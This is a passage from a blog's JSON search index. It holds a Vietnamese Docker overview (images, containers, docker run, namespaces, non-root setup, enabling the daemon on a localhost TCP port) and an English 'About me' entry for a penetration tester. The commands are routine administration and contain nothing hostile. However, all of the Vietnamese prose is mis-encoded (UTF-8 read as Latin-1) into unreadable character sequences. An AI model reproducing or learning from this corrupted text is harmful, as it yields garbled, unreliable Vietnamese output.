Ä‘Æ°á»£c kÃ©o tá»« registry cá»§a chÃºng ta vá» mÃ¡y, vÃ  khi thá»±c hiá»‡n lá»‡nh docker push, images cá»§a chÃºng ta sáº½ Ä‘Æ°á»£c Ä‘áº©y lÃªn trÃªn registry.\nDocker Object Images Má»™t image lÃ  má»™t máº«u chá»‰ Ä‘á»c vá»›i táº­p lá»‡nh Ä‘á»ƒ táº¡o ra má»™t docker container. ThÃ´ng thÆ°á»ng, má»™t image dá»±a trÃªn nhá»¯ng image khÃ¡c vá»›i má»™t sá»‘ tÃ¹y chá»‰nh bá»• sung. VÃ­ dá»¥, chÃºng ta muá»‘n xÃ¢y dá»±ng má»™t image dá»±a trÃªn ubuntu image, nhÆ°ng cÃ³ cÃ i thÃªm Apache web server, á»©ng dá»¥ng riÃªng cá»§a chÃºng ta cÅ©ng nhÆ° nhá»¯ng cáº¥u hÃ¬nh cáº§n thiáº¿t Ä‘á»ƒ cÃ³ á»©ng dá»¥ng cháº¡y.\nchÃºng ta cÃ³ thá»ƒ táº¡o images riÃªng hoáº·c sá»­ dá»¥ng nhá»¯ng images Ä‘Ã£ cÃ³ sáºµn trÃªn cÃ¡c registry.\nÄá»ƒ xÃ¢y dá»±ng riÃªng images, chÃºng ta táº¡o Dockfile vá»›i nhá»¯ng cÃº phÃ¡p Ä‘Æ¡n giáº£n Ä‘á»‹nh nghÄ©a cÃ¡c bÆ°á»›c cáº§n thiáº¿t Ä‘á»ƒ táº¡o image vÃ  cháº¡y nÃ³. Má»—i cÃ¢u lá»‡nh trong Dockerfile táº¡o má»™t layer trong image. Khi báº¡n thay Ä‘á»•i Dockerfile vÃ  rebuild image, chá»‰ nhá»¯ng layer bá»‹ thay Ä‘á»•i má»›i buil láº¡i. ÄÃ¢y chÃ­nh lÃ  lÃ­ do lÃ m cho image trá»Ÿ nÃªn nháº¹, nhá», nhanh khi Ä‘em so sÃ¡nh vá»›i nhá»¯ng cÃ´ng nghá»‡ áº£o hÃ³a khÃ¡c.\nContainers Docker Ä‘Ã³ng gÃ³i pháº§n má»m thÃ nh má»™t Ä‘Æ¡n vá»‹ chuáº©n, gá»i lÃ  container, nÆ¡i lÆ°u táº¥t cáº£ nhá»¯ng thá»© cáº§n thiáº¿t Ä‘á»ƒ cháº¡y pháº§n má»m, bao gá»“m: libraries, systemtools, and code Má»™t container cÃ³ thá»ƒ cháº¡y má»™t images. ChÃºng ta cÃ³ thá»ƒ create, start, stop, move, delete má»™t container báº±ng sá»­ dá»¥ng Docker API hoáº·c CLI. ChÃºng ta cÃ³ thá»ƒ káº¿t ná»‘i tá»« má»™t container tá»›i má»™t hoáº·c nhiá»u networks, Ä‘Ã­nh kÃ¨m bá»™ nhá»› vÃ o trong nÃ³, hoáº·c thÃ¢m chÃ­ cÃ³ thá»ƒ táº¡o ra má»™t image má»›i dá»±a trÃªn tráº¡ng thÃ¡i hiá»‡n táº¡i cá»§a nÃ³. Theo máº·c Ä‘á»‹nh, má»™t container Ä‘á»™c láº­p vá»›i nhá»¯ng container khÃ¡c vÃ  vá»›i host machine. ChÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t má»©c Ä‘á»™ Ä‘á»™c láº­p cá»§a network, bá»™ nhá»› hoáº·c nhá»¯ng há»‡ thá»‘ng con cÆ¡ báº£n tá»« mÃ´t container tá»›i nhá»¯ng container khÃ¡c hoáº·c tá»« host machine tá»›i nhá»¯ng container. Má»™t container Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a bá»Ÿi images cá»§a nÃ³, cÅ©ng nhÆ° báº¥t ká»³ tÃ¹y chá»n cáº¥u hÃ¬nh nÃ o báº¡n cung cáº¥p cho nÃ³ khi táº¡o hoáº·c khá»Ÿi Ä‘á»™ng nÃ³. Khi má»™t container bá»‹ xÃ³a, nhá»¯ng thay Ä‘á»•i vá» tráº¡ng thÃ¡i cá»§a nÃ³ khÃ´ng Ä‘Æ°á»£c lÆ°u mÃ  sáº½ bá»‹ xÃ³a. VÃ­ dá»¥ vá» docker run command Nhá»¯ng cÃ¢u lá»‡nh sau run má»™t ubuntu container:\n1 $ docker run -i -t ubuntu /bin/bash Khi chÃºng ta cháº¡y lá»‡nh nÃ y, quÃ¡ trÃ¬nh thá»±c hiá»‡n sáº½ nhÆ°u sau (xÃ©t trÆ°á»ng há»£p cáº¥u hÃ¬nh lÃ  default):\n1. Náº¿u chÃºng ta khÃ´ng cÃ³ ubuntu image á»Ÿ local, Docker pulls nÃ³ tá»« configured registry cá»§a chÃºng ta, chÃºng ta cÃ³ thá»ƒ kÃ©o nÃ³ xuá»‘ng báº±ng cÃ¢u lá»‡nh: docker pull ubuntu\n2. Docker táº¡o ra má»™t container má»›i, chÃºng ta cÃ³ thá»ƒ tá»± thá»±c hiá»‡n báº±ng lá»‡nh: docker container create.\n3. Docker phÃ¢n bá»• read-write filesystem vÃ o container, nhÆ° lÃ  lá»›p cuá»‘i cÃ¹ng cá»§a nÃ³ (final layer). NÃ³ cho phÃ©p cháº¡y Ä‘á»ƒ táº¡o hoáº·c chá»‰nh sá»­a file hoáº·c thÆ° má»¥c á»Ÿ local filesystem.\n4. Docker táº¡o ra network interface Ä‘á»ƒ Ä‘á»ƒ ná»‘i contain tá»›i default network, vÃ¬ chÃºng ta khÃ´ng chá»‰ Ä‘á»‹nh báº¥t kÃ¬ tÃ¹y chá»n máº¡ng nÃ o - gÃ¡n IP adress vÃ o container. Theo Ä‘á»‹nh nghÄ©a, container cÃ³ thá»ƒ káº¿t ná»‘i vá»›i máº¡ng bÃªn ngoÃ i thÃ´ng qua sá»­ dá»¥ng káº¿t ná»‘i máº¡ng cá»§a mÃ¡y host.\n5. Docker cháº¡y container rá»“i thá»±c thÃ¬ /bin/bash. VÃ¬ container Ä‘ang cháº¡y á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c vÃ  gÃ¡n vÃ o terminal (-i, -t flags), chÃºng ta cÃ³ thá»ƒ input tá»« keyboard vÃ  output Ä‘Æ°á»£c ghi vÃ o terminal cá»§a báº¡n.\n6. Khi chÃºng ta gÃµ exit Ä‘á»ƒ dá»«ng /bin/bash, container sáº½ dá»«ng nhÆ°ng khÃ´ng bá»‹ xÃ³a, do Ä‘Ã³, ta cÃ³ thá»ƒ cháº¡y láº¡i hoáº·c xÃ³a nÃ³.\nThe underlying technology Docker Ä‘Æ°á»£c viáº¿t báº±ng ngÃ´n ngá»¯ GO vÃ  táº­n dá»¥ng má»™t sá»‘ tÃ­nh nÄƒng tá»« Linux kernel Ä‘á»ƒ trá»Ÿ thÃ nh chá»©c nÄƒng cá»§a nÃ³.\nDocker sá»­ dá»¥ng má»™t cÃ´ng nghá»‡ Ä‘Æ°á»£c gá»i lÃ  namespaces Ä‘á»ƒ cung cáº¥p khÃ´ng gian Ä‘á»™c láº­p Ä‘Æ°á»£c gá»i lÃ  container. Khi báº¡n cháº¡y má»™t container, Docker táº¡o ra má»™t táº­p namespaces cho container Ä‘Ã³.\nNhá»¯ng namespaces cung cáº¥p má»™t lá»›p Ä‘á»™c láº­p, má»—i khÃ­a cáº¡nh cá»§a má»™t vÃ¹ng chá»©a cháº¡y trong má»™t khÃ´ng gian tÃªn riÃªng biá»‡t vÃ  quyá»n truy cáº­p cá»§a nÃ³ bá»‹ giá»›i háº¡n trong khÃ´ng gian tÃªn Ä‘Ã³.\nCÃ i docker Post-installation steps for Linux Quáº£n lÃ½ docker vá»›i tÆ° cÃ¡ch lÃ  non-root user Docker daemon káº¿t ná»‘i vá»›i Unix socket thay vÃ¬ cá»•ng TCP. Máº·c Ä‘á»‹nh, Unix socket Ä‘Æ°á»£c sá»Ÿ há»¯u bá»Ÿi root\nvÃ  nhá»¯ng user khÃ¡c chá»‰ cÃ³ thá»ƒ truy cáº­p thÃ´ng qua lá»‡nh sudo. Do Ä‘Ã³, Docker daemon luÃ´n luÃ´n cháº¡y\nvá»›i tÆ° cÃ¡ch lÃ  root user. ChÃºng ta cÃ³ thá»ƒ thiáº¿t láº­p láº¡i Ä‘á»ƒ cháº¡y mÃ  khÃ´ng cáº§n lá»‡nh sudo báº±ng cÃ¡ch táº¡o ra má»™t Unix group lÃ  docker\nvÃ  thÃªm user vÃ o nÃ³. Khi docker daemon cháº¡y, nÃ³ táº¡o má»™t Unix socket mÃ  táº¥t cáº£ cÃ¡c thÃ nh pháº§n cá»§a docker group\ncÃ³ thá»ƒ truy cáº­p vÃ o. Táº¡o docker group: 1 $ sudo groupadd docker ThÃªm user vÃ o docker group 1 $ sudo usermod -aG docker $USER KÃ­ch hoáº¡t sá»± thay Ä‘á»•i 1 $ newgrp docker Configure Docker to start on boot TrÃªn Debian vÃ  Ubuntu, Docker service máº·c Ä‘á»‹nh Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ khá»Ÿi Ä‘á»™ng khÃ­ boot.\nVá»›i nhá»¯ng distros khÃ¡c, ta cÃ³ thá»ƒ sá»­ dá»¥ng lá»‡nh sau Ä‘Ã¢y Ä‘á»ƒ tá»± Ä‘á»™ng cháº¡y: 1 2 $ sudo systemctl enable docker.service $ sudo systemctl enable containerd.service VÃ  Ä‘á»ƒ táº¯t cháº¿ Ä‘á»™ trÃªn: 1 2 $ sudo systemctl disable docker.service $ sudo systemctl disable containerd.service Cáº¥u hÃ¬nh nÆ¡i Docker daemon láº¯ng nghe Ä‘á»ƒ káº¿t ná»‘i Máº·c Ä‘á»‹nh, Docker daemon sáº½ nghe káº¿t ná»‘i á»Ÿ UNIX socket Ä‘á»ƒ cháº¥p nháº­n cÃ¡c yÃªu cáº§u tá»« local client.\nNgoÃ i ra, chÃºng ta cÃ³ thá»ƒ cho phÃ©p Docker cháº¥p nháº­n nhá»¯ng yÃªu cáº§u tá»« remote host báº±ng viá»‡c cáº¥u hÃ¬nh Ä‘á»ƒ nÃ³ láº¯ng nghe\ntrÃªn má»™t Ä‘á»‹a chá»‰ IP vÃ  má»™t cá»•ng, giá»‘ng nhÆ° UNIX socket. Configuring remote access with systemd unit file sudo systemctl edit docker.service Ä‘á»ƒ ghi Ä‘Ã¨ file docker.service. ThÃªm / sá»­a nhá»¯ng lá»‡nh sau: 1 2 3 [Service] ExecStart= ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375 LÆ°u file Reload láº¡i cáº¥u hÃ¬nh systemctl 1 $ sudo systemctl daemon-reload Cháº¡y láº¡i Docker 1 $ sudo systemctl restart docker.service Kiá»ƒm tra Ä‘áº£m báº£o sá»± thay Ä‘á»•i 1 $ sudo netstat -lntp | grep dockerd Configuring remote access with daemon.json ThÃªm dÃ²ng lá»‡nh vÃ o /etc/docker/daemon.json Ä‘á»ƒ káº¿t ná»‘i vá»›i UNIX socket vÃ  Ä‘á»‹a chá»‰ IP: 1 2 3 { \u0026#34;hosts\u0026#34;: [\u0026#34;unix:///var/run/docker.sock\u0026#34;, \u0026#34;tcp://127.0.0.1:2375\u0026#34;] } Khá»Ÿi Ä‘á»™ng láº¡i Docker Kiá»ƒm tra Ä‘áº£m báº£o sá»± thay Ä‘á»•i 1 $ sudo netstat -lntp | grep dockerd ThÃªm nhiá»u cáº¥u hÃ¬nh khÃ¡c\n","description":"Docker lÃ  ná»n táº£ng má»Ÿ (open platform) Ä‘á»ƒ phÃ¡t triá»ƒn (developing), váº­n chuyá»ƒn (shipping) hoáº·c cháº¡y (running) cÃ¡c á»©ng dá»¥ng.","id":26,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vá» docker","uri":"https://minhlongmt183.github.io/posts/docker_overview/"},{"content":"About me\nHi, I\u0026rsquo;m Long Vo Minh, also known as edisc, and I am a passionate cybersecurity researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on binary-related challenges (RE-PWN).\nCurrently, I work at ZaloPay as an Associate Security Engineer responsible for penetration testing of infrastructure systems, including on-premises servers and cloud computing services such as AWS and Kubernetes.\nIn addition, I have knowledge of web pen-testing and am currently studying basic security vulnerabilities such as IDOR, XSS, SQLI, and SSRF.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cybersecurity. I hope to inspire and support the next generation of Bach Khoa security professionals.\n","description":"Edisc","id":28,"section":"","tags":null,"title":"Edisc","uri":"https://minhlongmt183.github.io/about/"}]